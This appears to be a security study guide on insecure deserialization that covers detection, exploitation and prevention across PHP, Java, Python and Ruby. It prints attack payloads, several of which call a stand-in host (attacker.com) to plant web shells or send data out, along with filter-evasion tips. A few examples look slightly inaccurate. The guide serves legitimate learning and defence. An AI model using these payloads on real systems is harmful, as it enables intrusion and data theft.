## Insecure Deserialization

- **What serialization and deserialization are**
  - **Serialization**
    - The process of converting complex data structures (objects) into a flat format
    - Creates a byte stream that can be stored or transmitted
    - Preserves object state (all fields and their values)
    - Used for data persistence, inter-process communication, network transfer, and API calls
    - Different languages use different formats (binary, JSON, XML, etc.)
    - Also known as "marshalling" (Ruby) or "pickling" (Python)
  
  - **Deserialization**
    - The reverse process of restoring byte streams back into fully functional objects
    - Recreates objects with their original state (all fields and values)
    - Instantiates classes and populates fields with serialized data
    - Executed before application logic interacts with the object
    - Performs type conversion and memory allocation
    - Processes all data in the serialized stream, including unexpected or malicious content

- **What insecure deserialization is**
  - Processing user-controllable serialized data without sufficient validation
  - Allows manipulation of serialized objects to pass harmful data to application code
  - Enables instantiation of unexpected object types ("object injection")
  - Attacks often execute during the deserialization process itself
  - Can lead to serious security vulnerabilities even in strongly-typed languages
  - Nearly impossible to safely deserialize untrusted input
  - Provides an attacker with a rich attack surface through existing application code

- **How vulnerabilities arise**
  
  - **Common causes**
    - Lack of understanding of deserialization risks
    - Trust in serialized data (especially for binary formats)
    - Insufficient input validation before deserialization
    - Validation performed after deserialization (too late)
    - Dependencies creating large pools of available classes (gadget chains)
    - Application accepting serialized data from untrusted sources
    - Belief that obfuscated serialized formats are secure
    - Overly permissive deserialization mechanisms
  
  - **Typical vulnerable implementations**
    - Storing serialized objects in cookies for session management
    - Passing serialized data between different components of an application
    - Using serialization for browser-server communication
    - Implementing RPC (Remote Procedure Call) mechanisms
    - Caching complex objects in databases or files
    - Storing object state in hidden form fields
    - Using serialization for single sign-on tokens

- **Identifying insecure deserialization vulnerabilities**
  
  - **Recognizing serialized data formats**
    
    - **PHP serialization format**
      - Text-based format with type indicators
      - Example: `O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"12345"}`
      - Type indicators:
        - `O`: Object, followed by the class name length and class name
        - `s`: String, followed by the string length
        - `i`: Integer
        - `a`: Array
        - `b`: Boolean
      - Found in cookies, hidden form fields, URL parameters
    
    - **Java serialization format**
      - Binary format starting with magic bytes `AC ED 00 05` or base64 `rO0AB`
      - May be found in:
        - HTTP parameters, cookies
        - `ViewState` in ASP.NET applications (often contains serialized data)
        - Custom request/response bodies
        - JMX endpoints
      - Java implementations: native Java serialization, XStream, etc.
    
    - **Python pickle format**
      - Binary format typically encoded in base64
      - May start with `gASV` when base64 encoded
      - Used in Django sessions, caching systems, etc.
      - Found in cookies, request parameters, or API responses
    
    - **Ruby Marshal format**
      - Binary format often starting with `\x04\x08` (version indicators)
      - Used in Ruby on Rails cookies and caching
      - Often encoded in base64 for transmission
    
    - **JSON/XML based serialization**
      - More readable formats
      - Often include type information (e.g., `"__typename__"` or `"@class"`)
      - Common in modern web applications and APIs
      - Example JSON with type information:
        ```json
        {
          "__type__": "User",
          "username": "admin",
          "isAdmin": false
        }
        ```
  
  - **Manual testing techniques**
    
    - **Modifying serialized data**
      - Intercept requests containing suspected serialized data
      - Make small changes to serialized values
      - Observe application behavior (errors, changes in functionality)
      - Look for error messages revealing deserialization mechanisms
    
    - **Fuzzing serialized data**
      - Introduce format-breaking changes to serialized data
      - Manipulate length indicators (PHP strings, arrays)
      - Change type indicators in serialized objects
      - Look for detailed error messages
    
    - **Identifying serialization libraries**
      - Check for common error messages:
        - Java: `java.io.IOException: Cannot resolve class`
        - PHP: `unserialize(): Error at offset`
        - Ruby: `marshal data too short`
        - Python: `pickle deserialization failed`
      - Review JavaScript code for deserialization calls:
        - `JSON.parse()`
        - Custom deserialization functions
        - Data processing in AJAX responses
    
    - **Tracing data flow**
      - Identify sources of serialized data
      - Track how serialized data moves through the application
      - Detect points where deserialization occurs
      - Look for transformation or encoding before deserialization

- **Exploiting insecure deserialization**
  
  - **PHP deserialization attacks**
    
    - **Magic method exploitation**
      - Target magic methods that execute during deserialization:
        - `__wakeup()`: Called after deserialization
        - `__destruct()`: Called when object is destroyed
        - `__toString()`: Called when object is used as a string
      - Construct objects that chain these methods to execute malicious code
      - Example payload (simplistic):
        ```php
        // Target class with dangerous __destruct method
        class CustomTemplate {
          public $template_file = "malicious.php";
          
          function __destruct() {
            include($this->template_file);
          }
        }
        
        // Serialized payload
        O:14:"CustomTemplate":1:{s:13:"template_file";s:13:"malicious.php";}
        ```
    
    - **PHP gadget chains**
      - POP (Property-Oriented Programming) chains
      - Use existing classes in the application to create attack chains
      - Popular chains: phpggc (PHP Generic Gadget Chains)
      - Examples of dangerous gadget chains:
        - Monolog: RCE via log poisoning
        - Symfony: RCE via cache write
        - Laravel: RCE via Facade abuse
      - Example using phpggc for Laravel:
        ```
        php phpggc Laravel/RCE1 system 'id' -b
        ```
    
    - **PHP Type Juggling**
      - Exploit loose comparison (`==`) in PHP
      - Convert string objects to specific values
      - Example:
        ```php
        class Converter {
          public $value = "0";
          function __toString() {
            return $this->value;
          }
        }
        
        // Creates object that converts to "0" in string context
        // Bypasses checks like: if($user_provided == "0") { /* admin access */ }
        ```
  
  - **Java deserialization attacks**
    
    - **Leveraging gadget chains**
      - Use frameworks like ysoserial to generate payloads
      - Common gadget chains:
        - Apache Commons Collections
        - Spring Framework
        - Groovy
        - Java Runtime Environment
      - Example ysoserial command:
        ```
        java -jar ysoserial.jar CommonsCollections6 'wget http://attacker.com/shell.php -O /var/www/html/shell.php' | base64
        ```
    
    - **JMX exploitation**
      - Target Java Management Extensions endpoints
      - Often exposed on internal networks
      - Serialize MBean server interactions
      - Inject malicious operations via RMI
    
    - **Java deserialization tools**
      - ysoserial: Generate payloads for known gadget chains
      - URLDNS: Simple test gadget to verify vulnerability via DNS
      - Serialization Dumper: Analyze and modify serialized Java objects
      - SerializationInspector: Inspect and modify serialized data
    
    - **Jackson/JSON deserialization**
      - Target polymorphic type handling
      - Exploit `@class` or `type` attributes
      - Example payload:
        ```json
        {
          "@class": "org.springframework.context.support.ClassPathXmlApplicationContext",
          "configLocation": "http://malicious-server/evil.xml"
        }
        ```
  
  - **Python pickle exploitation**
    
    - **Exploiting __reduce__ method**
      - Override the `__reduce__` method to execute code during deserialization
      - Craft custom pickled objects that execute commands
      - Example payload:
        ```python
        import pickle
        import base64
        import os

        class RCE:
            def __reduce__(self):
                cmd = "curl http://attacker.com/shell.php -o /var/www/html/shell.php"
                return os.system, (cmd,)
                
        print(base64.b64encode(pickle.dumps(RCE())))
        ```
    
    - **Django cookie tampering**
      - Modify signed cookies containing pickled data
      - Target applications using `PickleSerializer`
      - Bypass signature verification when possible
    
    - **Python-specific tools**
      - pickletools: Analyze pickle opcodes
      - fickling: Tool for generating malicious pickles
      - Example fickling command:
        ```
        python3 -m fickling generate "import os; os.system('id')"
        ```
  
  - **Ruby Marshal exploitation**
    
    - **Exploiting ERB templates**
      - Target applications using ERB (Embedded Ruby)
      - Craft marshalled objects that evaluate Ruby code
      - Example payload:
        ```ruby
        require 'erb'
        erb = ERB.new("<%=`id`%>")
        File.open("payload.bin", "wb") { |f| f.write(Marshal.dump(erb)) }
        ```
    
    - **Rails cookie exploitation**
      - Target Rails applications using Marshal for cookies
      - Modify serialized cookies to execute code
      - Bypass HMAC verification when possible
    
    - **Ruby gadget chains**
      - Use Ruby's metaprogramming features
      - Chain methods like `method_missing` and `const_missing`
      - Target Rails' mass assignment functionality
  
  - **Generic deserialization attacks**
    
    - **Deserialization of untrusted data (DOTD)**
      - Modify object attributes to unexpected values
      - Inject malicious data in trusted fields
      - Bypass access controls by manipulating state
      - Example: Change user ID or role in serialized session
    
    - **Property injection**
      - Add or modify properties in serialized objects
      - Exploit optional parameters with dangerous side effects
      - Target applications with loose typing
      - Example: Adding `admin=true` to serialized user object
    
    - **Application-specific attacks**
      - Analyze custom deserialization logic
      - Target business logic flaws in object processing
      - Chain application-specific methods
      - Combine with other vulnerabilities (SQLi, SSRF, etc.)
      - Example: Modify serialized shopping cart to alter prices

- **Advanced exploitation techniques**
  
  - **Building custom gadget chains**
    
    - **Analyzing application code**
      - Identify classes with dangerous methods
      - Look for classes implementing serializable interfaces
      - Find methods that access the filesystem, network, or execute code
      - Target initialization methods, destructors, and conversion functions
    
    - **Chaining multiple gadgets**
      - Connect multiple objects via properties
      - Create complex chains for specific attacks
      - Example chain phases:
        1. Trigger point (magic method execution)
        2. Property reference chain (connect objects)
        3. Sink gadget (dangerous functionality)
    
    - **Bypassing protections**
      - Target alternative serialization formats (JSON, XML)
      - Use type confusion for filter bypass
      - Exploit nested serialization formats
      - Bypass allowlist of classes using polymorphism
  
  - **Exploiting memory corruption**
    
    - **Manipulating internal structures**
      - Craft malicious objects with invalid internal states
      - Target parser assumptions about object integrity
      - Exploit integer overflows in length fields
      - Example: PHP string length exploitation
        ```php
        // Crafting object with inconsistent string length
        O:8:"stdClass":1:{s:1:"a";s:10:"short"}
        ```
    
    - **Deserialization DoS attacks**
      - Create deeply nested structures
      - Exploit hash collisions
      - Construct serialized objects that cause excessive memory usage
      - Example: PHP billion laughs attack
        ```php
        a:1:{i:0;a:1:{i:0;a:1:{i:0;a:1:{i:0;a:1:{i:0;a:1:{...}}}}}}
        ```
  
  - **Side-channel exploitation**
    
    - **Blind deserialization attacks**
      - Use time delays to confirm vulnerability
      - Execute commands that cause network interactions
      - Example Java URLDNS gadget:
        ```
        java -jar ysoserial.jar URLDNS http://canary.example.com/
        ```
    
    - **Out-of-band (OOB) data exfiltration**
      - Extract sensitive data via DNS or HTTP requests
      - Use serialized objects that send data to attacker-controlled servers
      - Example PHP gadget:
        ```php
        class Exfiltrator {
          public $data = "sensitive data";
          function __destruct() {
            file_get_contents("http://attacker.com/?" . urlencode($this->data));
          }
        }
        ```

- **Evasion techniques**
  
  - **Bypassing signature checks**
    
    - **HMAC bypass**
      - Target weak signature algorithms
      - Look for client-side verification
      - Exploit signature length extension attacks
      - Example: SHA1 extension attack on signed cookies
    
    - **Type confusion attacks**
      - Switch between different serialization formats
      - Exploit inconsistent type handling
      - Example: Serialize as array, handle as object
        ```php
        // Instead of using object:
        O:4:"User":1:{s:4:"role";s:5:"admin"}
        
        // Use array with same keys:
        a:1:{s:4:"role";s:5:"admin"}
        ```
  
  - **Bypassing input filters**
    
    - **Format obfuscation**
      - Encode serialized data (base64, URL encoding)
      - Use nested encodings to bypass filters
      - Example nested encoding:
        ```
        base64(gzip(base64(serialized_data)))
        ```
    
    - **Class name obfuscation**
      - Use namespace confusion
      - Exploit case sensitivity differences
      - Example PHP:
        ```php
        // Instead of using:
        O:4:"User":1:{s:4:"role";s:5:"admin"}
        
        // Use fully qualified name:
        O:11:"\x00App\x00User":1:{s:4:"role";s:5:"admin"}
        ```
    
    - **Unicode normalization**
      - Use unicode characters that normalize to bypass filters
      - Exploit character encoding handling differences
      - Example: Using similar-looking unicode characters
  
  - **Bypassing WAF and security controls**
    
    - **Protocol level evasion**
      - Split serialized data across multiple requests
      - Use HTTP parameter pollution
      - Deliver payload through unconventional channels (headers, path components)
    
    - **Timing-based attacks**
      - Introduce delays to bypass rate limiting
      - Execute payload in small chunks
      - Use asynchronous execution to avoid detection

- **Language-specific serialization formats**
  
  - **PHP serialization format**
    - Text-based with type specifiers
    - Format: `[type]:[length]:[value]`
    - Example: `O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"isAdmin";b:1;}`
    - Type indicators:
      - `a`: Array
      - `b`: Boolean
      - `d`: Double
      - `i`: Integer
      - `o`: Object
      - `O`: Object with class name
      - `s`: String
    - Object format: `O:[class_name_length]:"[class_name]":[property_count]:{[properties]}`
  
  - **Java serialization format**
    - Binary format with magic header: `AC ED 00 05`
    - Base64 encoded often begins with `rO0AB`
    - Structure:
      - Stream header
      - Class descriptors
      - Object data
      - References to other objects
    - Uses TC_OBJECT, TC_CLASS, TC_STRING, etc. markers
  
  - **Python pickle format**
    - Binary protocol with opcodes
    - Common opcodes:
      - `c`: Import module and get attribute
      - `R`: Reduce (call function with arguments)
      - `(`: Push mark
      - `l`: Append to list
      - `d`: Set dictionary items
    - Example pickle that executes code:
      ```
      cos
      system
      (S'id'
      tR.
      ```
  
  - **Ruby Marshal format**
    - Binary format with version markers (`\x04\x08`)
    - Type indicators:
      - `"`: String
      - `:`: Symbol
      - `[`: Array
      - `{`: Hash
      - `o`: Object
      - `c`: Class
    - Supports object links and references
  
  - **JSON/XML-based serialization**
    - More readable, increasingly common
    - Often includes type information
    - Examples:
      - JSON: `{"__type__":"User","username":"admin","isAdmin":false}`
      - XML: `<object class="User"><property name="username">admin</property>...</object>`
    - Frameworks: Jackson, GSON, XStream, etc.

- **Prevention and mitigation**
  
  - **Secure design principles**
    
    - **Alternative data formats**
      - Use simpler data formats without object serialization
      - Prefer JSON, YAML, or XML without object metadata
      - Implement custom serialization for necessary objects
      - Example safer approach:
        ```javascript
        // Instead of serializing entire objects
        const userData = { name: user.name, email: user.email };
        const serialized = JSON.stringify(userData);
        ```
    
    - **Input validation**
      - Implement integrity checks for serialized data
      - Use cryptographic signatures (HMAC)
      - Validate all serialized data before deserialization
      - Example HMAC validation:
        ```java
        // Creating signed data
        String serialized = serialize(object);
        String hmac = calculateHMAC(secretKey, serialized);
        String result = serialized + "." + hmac;
        
        // Validating signed data
        String[] parts = input.split("\\.");
        String received = parts[0];
        String signature = parts[1];
        if (!calculateHMAC(secretKey, received).equals(signature)) {
            throw new SecurityException("Invalid signature");
        }
        Object deserialized = deserialize(received);
        ```
    
    - **Avoiding serialization for sensitive data**
      - Don't serialize entire objects with sensitive fields
      - Mark sensitive fields as transient
      - Implement custom serialization methods that exclude sensitive data
      - Example in Java:
        ```java
        public class User implements Serializable {
            private String username;
            private transient String password; // Won't be serialized
            
            private void writeObject(ObjectOutputStream out) throws IOException {
                out.defaultWriteObject();
                // Custom serialization logic
            }
            
            private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
                in.defaultReadObject();
                // Custom deserialization logic
            }
        }
        ```
  
  - **Implementation safeguards**
    
    - **Serialization filtering**
      - Implement whitelists of allowed classes
      - Java: Use ObjectInputFilter
      - PHP: Use allowed_classes parameter
      - Example in Java:
        ```java
        ObjectInputStream ois = new ObjectInputStream(inputStream);
        ois.setObjectInputFilter(filterInfo -> {
            Class<?> clazz = filterInfo.serialClass();
            if (clazz != null && 
                (SafeClass1.class.equals(clazz) || SafeClass2.class.equals(clazz))) {
                return ObjectInputFilter.Status.ALLOWED;
            }
            return ObjectInputFilter.Status.REJECTED;
        });
        ```
      - Example in PHP:
        ```php
        // Only allow specific classes
        $obj = unserialize($data, ['allowed_classes' => ['SafeClass1', 'SafeClass2']]);
        ```
    
    - **Defining safe deserializers**
      - Create custom deserializers for specific classes
      - Validate object state during deserialization
      - Reject abnormal object states
      - Example Jackson deserializer:
        ```java
        public class UserDeserializer extends JsonDeserializer<User> {
            @Override
            public User deserialize(JsonParser jp, DeserializationContext ctxt) throws IOException {
                JsonNode node = jp.getCodec().readTree(jp);
                String username = node.get("username").asText();
                boolean isAdmin = node.get("isAdmin").asBoolean();
                
                // Validate state
                if (username.length() > 30) {
                    throw new IOException("Invalid username length");
                }
                
                return new User(username, isAdmin);
            }
        }
        ```
    
    - **Runtime application self-protection (RASP)**
      - Deploy RASP solutions that monitor deserialization
      - Block known gadget chain execution patterns
      - Add instrumentation to detect suspicious activity during deserialization
  
  - **Architectural approaches**
    
    - **Serialization encapsulation**
      - Isolate deserialization in separate components
      - Use least privilege for deserialization processes
      - Implement "sandbox" environments for deserialization
    
    - **Using safer alternatives**
      - Replace native serialization with safer libraries
      - Java: Use JSON libraries instead of ObjectInputStream
      - PHP: Use JSON instead of unserialize()
      - Python: Use JSON instead of pickle
      - Example alternatives:
        - Java: Jackson with polymorphic type handling disabled
        - PHP: JSON encode/decode
        - Python: MessagePack, Protocol Buffers, or JSON
    
    - **Defense in depth**
      - Layer multiple protections
      - Combine signature verification, filtering, and monitoring
      - Implement network-level controls to detect exploitation attempts
      - Restrict outbound connections from deserialization components
